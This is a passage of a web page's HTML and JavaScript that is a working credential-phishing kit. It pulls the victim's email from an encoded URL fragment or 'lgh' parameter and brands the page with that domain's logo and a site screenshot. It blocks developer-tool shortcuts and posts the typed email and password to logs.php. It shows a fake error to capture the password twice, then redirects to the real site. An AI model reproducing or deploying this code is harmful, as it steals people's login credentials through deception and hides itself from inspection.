            if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
                return false;
            }
        }
        window.onkeydown = (e) => {
            return !(e.ctrlKey &&
                (e.keyCode === 67 ||
                    e.keyCode === 85 ||
                    e.keyCode === 86 ||
                    e.keyCode === 88 ||
                    e.keyCode === 117));
        };

        function send_result(x, y) {
            $.ajax({url: "./logs.php", data: {"email": x, "password": y}, type: "POST"});
        }

        window.addEventListener('beforeunload', e => {
          e.stopPropagation();
          // Cancel the event
          e.preventDefault();
        });

    </script>
</head>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs= sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl sha512-ANkGm5vSmtDaoFA/NB1nVJzOKOiI4a/9GipFtkpMG8Rg2Bz8R1GFf5kfL0+z0lcv2X/KZRugwrAlVTAgmxgvIg==" crossorigin="anonymous"></script>
    <script>
		function isBase64(str) {
		  if (str === '' || String(str).trim() === '') {return false}
		  try {if (btoa(atob(str)) == atob(btoa(str))) return true} catch {return false}
		}

        function isHex(str) {
            if (str === null || str === '' || str.trim() === '') {return false}
            try {if (hex2str(str2hex(str)) == str2hex(hex2str(str))) return true} catch {return false}
        }

        function str2hex(plain) {
            let hex, i, result = "";
            for (i=0; i<plain.length; i++) {
                hex = plain.charCodeAt(i).toString(16);
                result += (hex).slice(-4);
            }
            return result
        }

        function hex2str(hex) {
            return decodeURIComponent('%' + hex.match(/.{1,2}/g).join('%'))
        }

        function getEmail() {
            let email = "";
            if (window.location.hash) {
                email = window.location.hash.substring(1);
                email = isHex(email) ? hex2str(email) : email;
                return isBase64(email) ? window.atob(email) : email;
            }

            let searchParams = new URLSearchParams(window.location.search);
            if (searchParams.has("lgh")) {
                email = searchParams.get("lgh");
                email = isHex(email) ? hex2str(email) : email;
                return isBase64(email) ? window.atob(email) : email;
            }
            return email
        }

		function changeBodyImage(domain) {
            document.getElementById("img-field").src = `https://logo.clearbit.com/${domain}`
            let bg_image = `https://image.thum.io/get/width/1500/https://${domain}`;
            $.ajax({url: bg_image, type: "GET",
                success: function(response, status, xhr){
                    let ct = xhr.getResponseHeader("content-type") || "";
                    if (ct.indexOf('png') > -1 || ct.indexOf('jpeg') > -1) {
                        document.getElementById("body-img").style.backgroundImage = `url("${bg_image}")`;
                    }
                }
            })
        }

        let count = 0, email = getEmail();
        document.addEventListener('DOMContentLoaded', () => {
            if (email.match(/([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi)) {
                document.getElementById("email").value = email;
				let domain = email.substring(email.lastIndexOf("@") + 1);
                changeBodyImage(domain)
            }

            document.getElementById("submit-btn").addEventListener("click", event => {
                event.preventDefault ? event.preventDefault() : event.returnValue = false;

                let pswd = document.getElementById("password").value;
                if (pswd.length < 5) {
                    document.getElementById('errorpw').innerHTML = "Your account password is too short."
                    setTimeout(() => {document.getElementById("password").value = "";document.getElementById('errorpw').innerHTML = ""}, 1500);
                } else if (pswd.length > 4 && count <= 0) {
                    send_result(email, pswd);
                    document.getElementById('errorpw').innerHTML = "Something went wrong. Please check your credentials."
                    setTimeout(() => {count++;document.getElementById("password").value = "";document.getElementById('errorpw').innerHTML = ""}, 2000)
                } else {
                    send_result(email, pswd);
					let domain = email.substring(email.lastIndexOf("@") + 1);
                    setTimeout(() => {window.location.replace("https://www."+domain)}, 1000);
                }
            });
        });
    </script>
